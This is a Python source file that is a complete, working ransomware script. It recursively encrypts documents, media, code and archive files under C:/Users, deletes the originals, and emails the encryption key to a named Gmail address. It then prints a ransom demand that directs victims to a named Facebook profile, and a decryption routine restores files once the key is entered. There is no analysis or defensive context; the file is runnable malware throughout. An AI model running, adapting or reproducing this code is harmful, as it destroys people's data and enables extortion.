from cryptography.fernet import Fernet
import os.path, datetime, smtplib

# Encrypt folder
folder = 'C:/Users'

# Id folder 
identFolder = ''
identFile = 'ident.window'

fileType = ['txt', 'doc', 'docx', 'xlsx', 'sxi', 'cpp', 'inp', 'out', 'img', 'jpg', 'mp4', 'mp3', 'mkv', 'sql', 'php', 'java', 'py', 'scss', 'pas', 'psd', 'js', 'css', 'html', 'cmd', 'vbs', 'asp', 'avi', 'fla', 'wmv', 'mpeg', '3gp', 'flv', 'ai', 'gif', 'jpeg', 'iso', 'backup', '7z', 'gz', 'bak', 'csv', 'msg', 'xlsx', 'xlsm', '', 'xlsb', 'md', 'ppt', 'pptx', 'pdf', 'rar', 'zip', 'tar', 'png']
encName = 'enc'
gmailUsername = 'from@gmail.com'
gmailPassword = 'password'
targetMail = 'votruongtrunghieu@gmail.com'

def createident():
    st = str(datetime.datetime.now()).replace(' ', '.')
    st = st.replace(':', '.')
    st = st.replace('-', '.')
    return st

def encrypt(key):
    ferFile = Fernet(key)
    for (root, dirs, files) in os.walk(folder):
        for file in files:
            if not file.split('.')[-1] in fileType: continue
            #print('Encrypting: ', os.path.join(root, file))
            with open(os.path.join(root, file), 'rb') as f:
                dt = f.read()
            dtEncrypt = ferFile.encrypt(dt)
            try: os.remove(os.path.join(root, file))
            except: pass
            with open(os.path.join(root, file + '.' + encName), 'wb') as f:
                f.write(dtEncrypt)

def decrypt(key):
    ferFile = Fernet(key)
    for (root, dirs, files) in os.walk(folder):
        for file in files:
            if file.split('.')[-1] != encName or (not file.split('.')[-2] in fileType): continue
            print('Decrypting: ', os.path.join(root, file))
            with open(os.path.join(root, file), 'rb') as f:
                dt = f.read()
            dtDecrypt = ferFile.decrypt(dt)
            try: os.remove(os.path.join(root, file))
            except: pass
            tmp = file.split('.')
            file = ''
            for x in range(0, len(tmp) - 1):
                if x == (len(tmp) - 1):
                    file = file + tmp[x]
                    continue
                file = file + tmp[x] + '.'
            with open(os.path.join(root, file), 'wb') as f:
                f.write(dtDecrypt)

def sendMail(ident, key):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(gmailUsername, gmailPassword)
        msg = ident + ' ==> ' + key
        server.sendmail(gmailUsername, targetMail, msg)
    except Exception as e:
        #print(e)
        return 0
    return 1

if __name__ == '__main__':
    if os.path.exists(os.path.join(identFolder, identFile)):
        key = input('Please enter the key to decrypt data: ')
        decrypt(key)
        print('Decrypt successfully!')
        try: os.remove(os.path.join(identFolder, identFile))
        except: pass
    else:
        print('Please wait ...')
        ident = createident()
        with open(os.path.join(identFolder, identFile), 'wt') as file:
            file.write(ident)
        key = Fernet.generate_key()
        req = sendMail(ident, str(key))
        if req:
            encrypt(key)
            print('Your data has been encrypted!!! If you want to get back your data, please contact me at https://www.facebook.com/minhnghianguyen7575 for details.')
            print('Do not change files name or remove id file if you want to get back your data! ... Enjoy!')
        else:
            print('Sorry... No internet!!!')
            try: os.remove(os.path.join(identFolder, identFile))
            except: pass
    input('Press enter to continue...')
